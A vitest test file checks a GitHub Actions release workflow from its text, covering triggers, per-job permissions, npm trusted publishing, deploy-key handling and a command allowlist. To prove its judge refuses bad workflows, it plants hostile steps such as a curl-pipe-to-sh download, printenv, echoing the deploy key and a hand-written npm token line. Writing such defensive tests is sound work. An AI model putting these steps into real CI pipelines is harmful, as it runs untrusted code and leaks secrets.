// Check 05 (M7.02 and M7.06; credentials 1, 2 and 3 of `design/decisions/M7-release.md`): the release workflow is what its promises say.
// `.github/workflows/release.yml` cannot run here (it publishes to npm, makes a GitHub release and pushes to the tap), so it is judged from its text by `release-workflow.ts`, and the one step that needs no cloud is run:
// `credentials`. Written by the checks author; a builder never edits this file, `release-workflow.ts` or anything under `e2e/m7/` (tools/ci/builder-paths.sh).
// WHAT IT PINS. It starts on a pushed tag `v*` and on nothing else, and every job is in the `release` environment (which admits only `main` and `v*` tags). A job `preflight` that everything else needs checks the tap's deploy key
// is set (`credentials`) and that the tag agrees with every package's version (`agreement`, `tools/release/release.mjs check`, judged by check 06), so nothing is sent from a run that cannot finish. One job publishes the npm
// packages (`node tools/release/release.mjs publish`, last step, after the install and the build) with `id-token: write` and `NPM_CONFIG_PROVENANCE`: npm's trusted publishing, so no token is stored and none is named, nor any
// `.npmrc` token line. One job makes the GitHub release with the binaries and their sha256 (`ortho publish --release`, check 08) holding `contents: write` and the job's own token, and pushes the formula to the tap in a last
// step `push-tap` (`ortho publish --push-tap`): the deploy key is in the env of that step and of `credentials` and of no other. No job holds both `id-token: write` and `contents: write`. Nothing is skipped, ignored or hidden.
// ALLOWLIST. Every `run:` of every job is one of: the install (`pnpm install --frozen-lockfile`) or the build (`pnpm nx run-many -t build`), exactly; or a named step with its exact command: `agreement`, the npm publish, `release`
// (`node packages/cli/src/main.ts publish --release --root examples/acme`: acme's CLI only, M7.06's formula), `push-tap` (its whole script: the key written once with printf to a file under `$RUNNER_TEMP`, ssh by that file), and
// `remove-key` (`rm -f "$RUNNER_TEMP/tap-key"`, `if: always()`, right after the push and last). So `pnpm publish -r`, a second `npm publish`, `gh release create` and `git push --force` each fail.
// NOT PINNED (left to the builder, decided by the lead): the platforms the binaries are built on (runs-on and actions follow staging.yml's pins). A prerelease tag is refused (checks 06 and 08); Orthograph's own formula comes later.
// Red today on one reason: the file does not exist. Controls, true today: the judge fails each planted wrong workflow below (a plant is one edit of the parsed file, so none depends on the file's layout).
import { spawnSync } from "node:child_process";
import { existsSync, readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { parse, stringify } from "yaml";
import { repo } from "./support.ts";
import { PATH, problems, TAP_KEY } from "./release-workflow.ts";

const file = join(repo, PATH);
const real = existsSync(file) ? readFileSync(file, "utf8") : "";
const present = (what: string) => expect(existsSync(file), `${PATH} does not exist (${what})`).toBe(true);
type Step = Record<string, any>;
type Doc = Record<string, any> & { jobs: Record<string, Record<string, any> & { steps: any[] }> };

/** The real workflow, parsed, changed in one place and written out again. A job or step that is not there stops the plant, so one that matches nothing is not a pass. */
const plant = (edit: (doc: Doc, step: (id: string) => Step, job: (id: string) => Doc["jobs"][string]) => void): string => {
  present("a plant needs it");
  const doc = parse(real) as Doc;
  const job = (id: string) => doc.jobs[id] ?? (() => { throw new Error(`the workflow has no job ${id} to plant over`); })();
  const step = (id: string) => Object.values(doc.jobs).flatMap((j) => j.steps).find((s) => s["id"] === id) ?? (() => { throw new Error(`the workflow has no step ${id} to plant over`); })();
  edit(doc, step, job);
  return stringify(doc);
};
const swap = (from: string | RegExp, to: string) => {
  present("a plant needs it");
  if (!(typeof from === "string" ? real.includes(from) : from.test(real))) throw new Error(`the workflow has no ${String(from)} to plant over`);
  return real.replace(from, to);
};
const npm = (d: Doc) => Object.values(d.jobs).find((j) => j.steps.some((s) => s["run"] === "node tools/release/release.mjs publish")) ?? (() => { throw new Error("no npm job"); })();
const github = (d: Doc) => Object.values(d.jobs).find((j) => j.steps.some((s) => s["id"] === "push-tap")) ?? (() => { throw new Error("no github job"); })();

describe("05: the release workflow (M7.02, M7.06), judged from its text", () => {
  it("is what the check says", () => {
    present("it is the workflow that publishes a release");
    expect(problems(real)).toEqual([]);
  });

  it("starts on a pushed tag v* and on nothing else", () => {
    present("no workflow, no release");
    expect((parse(real) as Doc)["on"]).toEqual({ push: { tags: ["v*"] } });
  });

  it("holds no npm token anywhere in the repository's workflows, tools or npm config", () => {
    present("it is what must hold none");
    const files = [
      ...readdirSync(join(repo, ".github/workflows")).map((f) => join(repo, ".github/workflows", f)),
      ...(existsSync(join(repo, "tools/release")) ? readdirSync(join(repo, "tools/release")).map((f) => join(repo, "tools/release", f)) : []),
      ...[".npmrc", "packages/orthograph/.npmrc"].map((f) => join(repo, f)).filter(existsSync),
    ];
    for (const f of files) expect(readFileSync(f, "utf8"), f).not.toMatch(/_authToken|NODE_AUTH_TOKEN|NPM_TOKEN/);
  });

  describe("the credentials step refuses, before anything is sent, and says which is missing", () => {
    const SENTINEL = "sentinel-3d9a1f60";
    // The step's own `run:`, as GitHub reads it, run by bash with only these variables.
    const run = (env: Record<string, string>) => {
      present("its preflight job checks the credential");
      const body = String((parse(real) as Doc).jobs["preflight"]?.steps.find((s) => s["id"] === "credentials")?.["run"] ?? "");
      expect(body, "the credentials step has a script").not.toBe("");
      const done = spawnSync("bash", ["-c", body], { encoding: "utf8", env: { PATH: process.env["PATH"] ?? "", ...env } });
      return { status: done.status, said: `${done.stdout}${done.stderr}` };
    };
    it("not set: exit 1, the name said", () => {
      const r = run({});
      expect([r.status, /HOMEBREW_TAP_DEPLOY_KEY/.test(r.said)]).toEqual([1, true]);
    });
    it("empty, or only blanks, counts as not set", () => {
      for (const value of ["", "   ", "\n"]) expect(run({ HOMEBREW_TAP_DEPLOY_KEY: value }).status, JSON.stringify(value)).toBe(1);
    });
    it("set: exit 0, and the value is not printed", () => {
      const r = run({ HOMEBREW_TAP_DEPLOY_KEY: SENTINEL });
      expect([r.status, r.said.includes(SENTINEL)]).toEqual([0, false]);
    });
    it("a refusal never prints the value either", () => {
      expect(run({ HOMEBREW_TAP_DEPLOY_KEY: "  " }).said).not.toContain(SENTINEL);
    });
  });

  describe("the judge fails each planted wrong workflow", () => {
    // Every thing the judge reads, planted wrong one way at a time (the table in the pull request: each row is one thing read against one way).
    const plants: ReadonlyArray<readonly [string, () => string, RegExp]> = [
      // ---- how it starts ----
      ["a branch push beside the tag", () => plant((d) => { d["on"].push.branches = ["main"]; }), /starts on/],
      ["a pull request trigger", () => plant((d) => { d["on"] = { pull_request: null, push: d["on"].push }; }), /starts on|trigger other/],
      ["a hand-started run beside the tag", () => plant((d) => { d["on"].workflow_dispatch = null; }), /starts on|trigger other/],
      ["a schedule beside the tag", () => plant((d) => { d["on"].schedule = [{ cron: "0 3 * * *" }]; }), /starts on|trigger other/],
      ["a tag pattern that is wider than v*", () => plant((d) => { d["on"].push.tags = ["*"]; }), /starts on/],
      ["no concurrency group", () => plant((d) => { delete d["concurrency"]; }), /concurrency/],
      ["a concurrency group that cancels the run in progress", () => plant((d) => { d["concurrency"]["cancel-in-progress"] = true; }), /concurrency/],
      ["a workflow-wide env", () => plant((d) => { d["env"] = { CI: "1" }; }), /top level/],
      // ---- permissions: least per job, and never both ----
      ["write on the whole workflow", () => plant((d) => { d["permissions"] = { contents: "write" }; }), /workflow's permissions/],
      ["the npm job without the id token", () => plant((d) => { delete npm(d)["permissions"]["id-token"]; }), /permissions are/],
      ["the npm job with contents: write", () => plant((d) => { npm(d)["permissions"]["contents"] = "write"; }), /permissions are/],
      ["the npm job with another permission", () => plant((d) => { npm(d)["permissions"]["packages"] = "write"; }), /permissions are/],
      ["the github job with the id token", () => plant((d) => { github(d)["permissions"]["id-token"] = "write"; }), /permissions are/],
      ["the github job read-only", () => plant((d) => { github(d)["permissions"]["contents"] = "read"; }), /permissions are/],
      ["the preflight job with the id token", () => plant((d, s, j) => { j("preflight")["permissions"]["id-token"] = "write"; }), /permissions are/],
      ["a job with no permissions of its own (it would inherit)", () => plant((d, s, j) => { delete j("preflight")["permissions"]; }), /permissions are/],
      ["one job that both publishes and releases", () => plant((d) => { const g = github(d), n = npm(d); g["steps"].push(...n["steps"].filter((x: Step) => x["run"] === "node tools/release/release.mjs publish")); }), /both publishes|publish step|last step/],
      // ---- the environment, the timeout, what a job needs ----
      ["a job outside the release environment", () => plant((d, s, j) => { delete j("preflight")["environment"]; }), /environment/],
      ["a job in the staging environment", () => plant((d) => { npm(d)["environment"] = "staging"; }), /environment/],
      ["a job with no timeout", () => plant((d) => { delete github(d)["timeout-minutes"]; }), /timeout/],
      ["a job that runs for hours", () => plant((d) => { npm(d)["timeout-minutes"] = 360; }), /timeout/],
      ["the npm job not needing preflight", () => plant((d) => { delete npm(d)["needs"]; }), /does not need preflight/],
      ["the github job needing a job that is not preflight", () => plant((d) => { github(d)["needs"] = ["npm"]; }), /does not need preflight/],
      ["no preflight job", () => plant((d) => { delete d.jobs["preflight"]; }), /no job `preflight`/],
      // ---- the version's agreement and the credential, before anything is sent ----
      ["no agreement step", () => plant((d, s) => { s("agreement")["id"] = "other"; }), /no step `agreement`/],
      ["an agreement step that checks something else", () => plant((d, s) => { s("agreement")["run"] = "echo ok"; }), /no step `agreement`/],
      ["an agreement step that runs with a token", () => plant((d, s) => { s("agreement")["env"] = { GH_TOKEN: "${{ github.token }}" }; }), /no step `agreement`|holds the job's token/],
      ["an agreement step that can be skipped", () => plant((d, s) => { s("agreement")["if"] = "false"; }), /has an `if`/],
      ["the version checked before the credential", () => plant((d, s, j) => { const st = j("preflight")["steps"]; st.reverse(); }), /before the credential/],
      ["no credentials step", () => plant((d, s) => { s("credentials")["id"] = "creds"; }), /no step `credentials`|deploy key is in/],
      ["a credentials step holding another secret as well", () => plant((d, s) => { s("credentials")["env"]["EXTRA"] = "${{ github.token }}"; }), /credentials' env|holds the job's token/],
      ["a credentials step that runs a program", () => plant((d, s) => { s("credentials")["run"] = "node -e 'process.exit(0)'"; }), /plain shell/],
      ["a credentials step that prints the key", () => plant((d, s) => { s("credentials")["run"] += '\necho "$HOMEBREW_TAP_DEPLOY_KEY" | git hash-object --stdin'; }), /plain shell|forbidden|names/],
      // ---- npm: trusted publishing, no token ----
      ["no provenance", () => plant((d) => { const n = npm(d); delete n["steps"].find((x: Step) => x["run"] === "node tools/release/release.mjs publish")["env"]; }), /publish step's env/],
      ["provenance switched off", () => plant((d) => { npm(d)["steps"].find((x: Step) => x["run"] === "node tools/release/release.mjs publish")["env"]["NPM_CONFIG_PROVENANCE"] = "false"; }), /publish step's env|provenance/],
      ["an npm token in the publish step", () => plant((d) => { npm(d)["steps"].find((x: Step) => x["run"] === "node tools/release/release.mjs publish")["env"]["NODE_AUTH_TOKEN"] = "${{ secrets.NPM_TOKEN }}"; }), /npm token|expression/],
      ["setup-node writing an .npmrc token line", () => plant((d) => { npm(d)["steps"].find((x: Step) => /setup-node/.test(x["uses"] ?? ""))["with"]["registry-url"] = "https://registry.npmjs.org"; }), /registry-url|setup-node is exactly/],
      ["an .npmrc written by hand", () => plant((d) => { npm(d)["steps"].splice(-1, 0, { run: 'echo "//registry.npmjs.org/:_authToken=x" > ~/.npmrc' }); }), /_authToken|\.npmrc/],
      ["npm login in a step", () => plant((d) => { npm(d)["steps"].splice(-1, 0, { run: "npm login" }); }), /npm token|\.npmrc/],
      ["a step after the publish", () => plant((d) => { npm(d)["steps"].push({ run: "echo done" }); }), /last step/],
      ["the publish before the build", () => plant((d) => { const st = npm(d)["steps"]; const [p] = st.splice(st.length - 1, 1); st.splice(2, 0, p); }), /install and the build/],
      ["the publish before the install", () => plant((d) => { const st = npm(d)["steps"]; st.splice(st.findIndex((x: Step) => /pnpm install/.test(x["run"] ?? "")), 1); }), /install and the build/],
      ["a publish that ignores failure", () => plant((d) => { npm(d)["steps"].find((x: Step) => x["run"] === "node tools/release/release.mjs publish")["continue-on-error"] = true; }), /ignored|hidden/],
      ["a publish that is only sometimes run", () => plant((d) => { npm(d)["steps"].find((x: Step) => x["run"] === "node tools/release/release.mjs publish")["if"] = "always()"; }), /has an `if`/],
      ["two jobs that publish to npm", () => plant((d, s, j) => { j("preflight")["steps"].push({ run: "node tools/release/release.mjs publish" }); }), /jobs publish to npm|permissions are/],
      // ---- the GitHub release and the tap ----
      ["a release step with the key", () => plant((d, s) => { s("release")["env"]["HOMEBREW_TAP_DEPLOY_KEY"] = TAP_KEY; }), /release step's env|only the step/],
      ["a release step with a personal token", () => plant((d, s) => { s("release")["env"]["GH_TOKEN"] = "${{ secrets.GH_PAT }}"; }), /not one this workflow may use|release step's env/],
      ["a release step that is not the release command", () => plant((d, s) => { s("release")["run"] = "gh release create $GITHUB_REF_NAME"; }), /release step is not/],
      ["a release step with no root", () => plant((d, s) => { s("release")["run"] = "node packages/cli/src/main.ts publish --release"; }), /release step is not/],
      ["a release step cloning another tap", () => plant((d, s) => { s("release")["env"]["ORTHO_TAP_REMOTE"] = "https://github.com/someone/homebrew-tap.git"; }), /release step's env/],
      ["the push step pushing to another tap", () => plant((d, s) => { s("push-tap")["env"]["ORTHO_TAP_REMOTE"] = "git@github.com:someone/homebrew-tap.git"; }), /push step's env/],
      ["the push step without the key", () => plant((d, s) => { delete s("push-tap")["env"]["HOMEBREW_TAP_DEPLOY_KEY"]; }), /push step's env|deploy key is in/],
      ["the push step with the job's token as well", () => plant((d, s) => { s("push-tap")["env"]["GH_TOKEN"] = "${{ github.token }}"; }), /push step's env|holds the job's token/],
      ["the push step that echoes the key", () => plant((d, s) => { s("push-tap")["run"] = `echo "$HOMEBREW_TAP_DEPLOY_KEY" > "$RUNNER_TEMP/k"\n${s("push-tap")["run"]}`; }), /push step's script/],
      ["the push step that writes the key with the world able to read it", () => plant((d, s) => { s("push-tap")["run"] = String(s("push-tap")["run"]).replace("umask 077\n", ""); }), /umask 077/],
      ["the push step not the last", () => plant((d) => { github(d)["steps"].push({ run: "echo done" }); }), /remove-key/],
      ["the push before the release", () => plant((d) => { const st = github(d)["steps"]; const a = st.findIndex((x: Step) => x["id"] === "release"), b = st.findIndex((x: Step) => x["id"] === "push-tap"); [st[a], st[b]] = [st[b], st[a]]; }), /does not come before/],
      ["the key in a third step", () => plant((d) => { github(d)["steps"].splice(0, 0, { id: "third", env: { HOMEBREW_TAP_DEPLOY_KEY: TAP_KEY }, run: "true" }); }), /only the step that checks it|deploy key is in/],
      ["the key in a job's env", () => plant((d, s, j) => { j("npm")["env"] = { K: TAP_KEY }; }), /has env/],
      ["a job skipped by an `if`", () => plant((d) => { npm(d)["if"] = "false"; }), /has if/],
      ["a self-hosted runner", () => plant((d) => { npm(d)["runs-on"] = "self-hosted"; }), /runs-on/],
      ["a second job that pushes", () => plant((d) => { d.jobs["again"] = { ...structuredClone(github(d)), needs: ["preflight"] }; }), /exactly one job must make/],
      // ---- the allowlist of run commands, the project, the key's file ----
      ["pnpm publish -r in the GitHub job", () => plant((d) => { github(d)["steps"].splice(1, 0, { run: "pnpm publish -r --no-git-checks --access public" }); }), /allowlist/],
      ["an extra npm publish before the pinned one", () => plant((d) => { npm(d)["steps"].splice(-1, 0, { run: "npm publish --workspaces --provenance" }); }), /allowlist/],
      ["gh release create --prerelease", () => plant((d) => { github(d)["steps"].splice(1, 0, { run: "gh release create $GITHUB_REF_NAME --prerelease" }); }), /allowlist/],
      ["git push --force", () => plant((d) => { github(d)["steps"].splice(1, 0, { run: "git push --force origin HEAD:main" }); }), /allowlist/],
      ["an extra step in preflight", () => plant((d, s, j) => { j("preflight")["steps"].push({ run: "node tools/release/release.mjs publish" }); }), /jobs publish to npm|permissions are|allowlist/],
      ["the pinned publish with a flag added", () => plant((d) => { npm(d)["steps"].find((x: Step) => x["run"] === "node tools/release/release.mjs publish")["run"] += " -r"; }), /allowlist|no step|publish/],
      ["the install with a flag added", () => plant((d) => { const st = npm(d)["steps"].find((x: Step) => x["run"] === "pnpm install --frozen-lockfile"); st["run"] += " --force"; }), /allowlist/],
      ["the build changed to another target", () => plant((d) => { const st = npm(d)["steps"].find((x: Step) => /nx run-many/.test(x["run"] ?? "")); st["run"] = "pnpm nx run-many -t deploy"; }), /allowlist/],
      ["the release step on Orthograph itself (--root .)", () => plant((d, s) => { s("release")["run"] = "node packages/cli/src/main.ts publish --release --root ."; }), /release step is not exactly/],
      ["the release step on the starter", () => plant((d, s) => { s("release")["run"] = "node packages/cli/src/main.ts publish --release --root examples/starter"; }), /release step is not exactly/],
      ["the push step on the starter", () => plant((d, s) => { s("push-tap")["run"] = String(s("push-tap")["run"]).replace("examples/acme", "examples/starter"); }), /push step's script/],
      ["the key written into the workspace", () => plant((d, s) => { s("push-tap")["run"] = String(s("push-tap")["run"]).replace("$RUNNER_TEMP/tap-key", "tap-key"); }), /push step's script/],
      ["the key's file never removed", () => plant((d) => { const st = github(d)["steps"]; st.splice(st.findIndex((x: Step) => x["id"] === "remove-key"), 1); }), /remove-key/],
      ["the key's removal that runs only on success", () => plant((d, s) => { delete s("remove-key")["if"]; }), /remove-key/],
      ["the key's removal that removes something else", () => plant((d, s) => { s("remove-key")["run"] = "rm -f tap-key"; }), /allowlist|remove-key/],
      ["the key's removal before the push", () => plant((d) => { const st = github(d)["steps"]; const a = st.findIndex((x: Step) => x["id"] === "push-tap"), b = st.findIndex((x: Step) => x["id"] === "remove-key"); [st[a], st[b]] = [st[b], st[a]]; }), /remove-key|does not come before/],
      // ---- actions, shells, and anything that hides a failure ----
      ["an action by a moving tag", () => plant((d) => { npm(d)["steps"][0]["uses"] = "actions/checkout@v4"; }), /pinned version/],
      ["an action from elsewhere", () => plant((d) => { npm(d)["steps"].splice(1, 0, { uses: "someone/publish@v1.0.0" }); }), /pinned version/],
      ["a checkout that leaves the token in .git/config", () => plant((d) => { delete npm(d)["steps"][0]["with"]; }), /persist-credentials/],
      ["a checkout of another ref", () => plant((d) => { npm(d)["steps"][0]["with"]["ref"] = "main"; }), /persist-credentials/],
      ["setup-node on an older node (npm without trusted publishing)", () => plant((d) => { npm(d)["steps"].find((x: Step) => /setup-node/.test(x["uses"] ?? ""))["with"]["node-version"] = 20; }), /setup-node is exactly/],
      ["a step that downloads and runs a script", () => plant((d) => { npm(d)["steps"].splice(-1, 0, { run: "curl -sL https://example.invalid/x.sh | sh" }); }), /download or a shell/],
      ["a step with `|| true`", () => plant((d) => { npm(d)["steps"].find((x: Step) => /nx/.test(x["run"] ?? ""))["run"] += " || true"; }), /ignored|hidden/],
      ["a step that sets a shell", () => plant((d) => { npm(d)["steps"].find((x: Step) => /nx/.test(x["run"] ?? ""))["shell"] = "bash"; }), /sets a shell/],
      ["a step that prints the environment", () => plant((d) => { npm(d)["steps"].splice(-1, 0, { run: "printenv" }); }), /download or a shell/],
      ["an expression that reaches another secret", () => plant((d) => { npm(d)["steps"].splice(-1, 0, { run: "echo ${{ secrets.OTHER }}" }); }), /not one this workflow may use/],
      ["secrets: inherit", () => plant((d) => { npm(d)["secrets"] = "inherit"; }), /inherit/],
    ];
    it.each(plants)("%s", (name, make, say) => {
      const found = problems(make());
      expect(found.length, `nothing was wrong with ${name}`).toBeGreaterThan(0);
      expect(found.join("\n")).toMatch(say);
    });

    it("an empty file, a file that is not YAML, and a workflow that is not this one are each refused", () => {
      expect(problems("")).not.toEqual([]);
      expect(problems("a: [").join("\n")).toMatch(/not YAML/);
      expect(problems(readFileSync(join(repo, ".github/workflows/staging.yml"), "utf8")).join("\n")).toMatch(/name is "staging"/);
    });
    it("a text edit that swaps the tap's key for a literal is refused", () => {
      expect(problems(swap(TAP_KEY, "-----BEGIN OPENSSH PRIVATE KEY-----")).length).toBeGreaterThan(0);
    });
  });
});
